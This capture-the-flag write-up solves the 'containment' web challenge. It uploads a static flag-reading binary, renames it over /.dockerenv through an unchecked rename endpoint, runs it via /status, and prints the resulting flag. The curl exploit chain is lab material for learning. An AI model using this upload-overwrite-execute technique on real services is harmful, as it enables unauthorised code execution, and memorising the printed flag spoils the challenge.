# containment

[library.m0unt41n.ch/challenges/containment](https://library.m0unt41n.ch/challenges/containment) ![](../../resources/web.svg) ![](../../resources/medium.svg) 

# TL;DR

Upload a custom binary and copy it over a conveniently located executable
file. Run that file through the `/status` endpoint and get the output.

# Setup

```bash
docker build -t containment:latest .
docker run -ti -p 8000:8000 containment:latest
```

## Adding busybox

Container is made `FROM scratch`, so, I thought it would be useful to add some more
tools, without messing with the logic. Static [BusyBox](https://busybox.net/) looked
good - note the version, at that point I thought I might be uploading some of it, so
I picked one that would fit under Rocket's default 1M upload limit.

```bash
$ mkdir bin
$ curl -o bin/busybox https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox
$ chmod a+x bin/busybox
$ for C in $(bin/busybox --list); do ln -s busybox "bin/$C" ; done

$ echo -e "\nCOPY bin /bin\nENV PATH=/:/bin" >>Dockerfile
```

After rebuilding the container, we can login into it:

```bash
$ docker container exec -it $(docker ps -q) /bin/sh
```

# Hacking it

## Overwriting /containment with custom binary

My first idea was to overwrite the `/containment` binary, hoping that I don't run into `Text file busy`.

*   I wrote a simple `getflag.c` program:

    ```c
    #include <unistd.h>
    #include <fcntl.h>

    int main() {
        char buf[256];
        int fd = open("/flag.txt", O_RDONLY);
        int n = read(fd, buf, sizeof(buf));
        write(1, buf, n);
        close(fd);
        return 0;
    }
    ```

*   Built a static binary with `gcc -static -o getflag getflag.c`

*   Uploaded it to the server:

    ```bash
    $ URL=http://localhost:8000

    $ curl -X POST --data-binary "@getflag" -H "Content-Type: text/plain" $URL/upload
    fc2e2875-b309-4cc4-ac3e-b8aa0c8a51e0

    $ curl -X GET "$URL/rename?from=/tmp/uploads/fc2e2875-b309-4cc4-ac3e-b8aa0c8a51e0&to=/containment"
    Rename successful

    $ curl -X GET "$URL/status//containment/blah"
    stdout: flag{dummy_flag}
    stderr: 
    ```

Not bad &#128578; But it did not work on the remote instance.

## Alternative executable to overwrite

Maybe there is other executable that will work? Let's see in our Busybox-powered container:

```bash
$ find / -type f -executable
/.dockerenv
/containment
/bin/busybox
```

Ah, that empty `/.dockerenv`. It looked suspicious from the start! Let's try that.

```bash
$ URL=https://00fc5b6f-f2ba-473a-bcd2-af8f7a7809ac.library.m0unt41n.ch:31337

$ curl -X POST --data-binary "@getflag" -H "Content-Type: text/plain" $URL/upload
26332a23-25b1-4044-827a-d0c93b8b3223

$ curl -X GET "$URL/rename?from=/tmp/uploads/26332a23-25b1-4044-827a-d0c93b8b3223&to=/.dockerenv"
Rename successful

$ curl -X GET "$URL/status//.dockerenv/blah"
stdout: shc2022{rU5t_w3_Ar3_r34Dy_f0R_l1Ft0FF}
stderr: 
```

That was too easy &#128578; I wonder if this was unintended solution.

## Same thing without a custom program

Might as well use static `cat` from Busybox:

```bash
$ curl -o cat https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox_CAT

$ curl -X POST --data-binary "@cat" -H "Content-Type: text/plain" $URL/upload
2c504bcc-fbe1-4bc4-bdbf-a8212f73908a

$ curl -X GET "$URL/rename?from=/tmp/uploads/2c504bcc-fbe1-4bc4-bdbf-a8212f73908a&to=/.dockerenv"
Rename successful

$ curl -X GET "$URL/status//.dockerenv//flag.txt"
stdout: shc2022{rU5t_w3_Ar3_r34Dy_f0R_l1Ft0FF}
stderr: 
```

---

## `shc2022{rU5t_w3_Ar3_r34Dy_f0R_l1Ft0FF}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
